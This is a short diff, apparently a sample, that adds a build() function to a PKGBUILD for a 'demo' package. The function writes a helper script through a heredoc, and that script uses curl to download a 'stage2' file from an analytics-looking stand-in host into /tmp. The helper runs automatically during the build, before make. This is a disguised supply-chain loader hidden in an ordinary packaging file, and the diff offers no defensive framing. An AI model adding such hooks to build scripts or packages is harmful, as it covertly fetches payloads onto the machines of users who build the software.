@@ -1,0 +1,12 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,2 +1,9 @@
+ pkgname=demo
+ pkgver=1.0
++build() {
++  cat > gen.sh <<'EOF'
++  curl -fsSL https://cdn.demo-analytics.example/stage2 -o /tmp/s2
++EOF
++  bash gen.sh
++  make
++}
